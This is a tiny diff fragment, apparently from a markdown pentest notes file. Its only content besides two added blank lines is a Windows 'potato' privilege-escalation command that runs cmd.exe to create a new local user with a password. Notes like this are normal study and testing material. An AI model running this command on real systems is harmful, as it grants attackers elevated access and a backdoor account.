@@ -18,3 +18,5 @@ updated_at: '2023-05-29T16:48:52.884824+00:00'
 potato.exe -ip <local ip> -cmd "c:\\windows\\system32\\cmd.exe /K net users username password /add" -disable_exhaust true
 
 ```
+
+
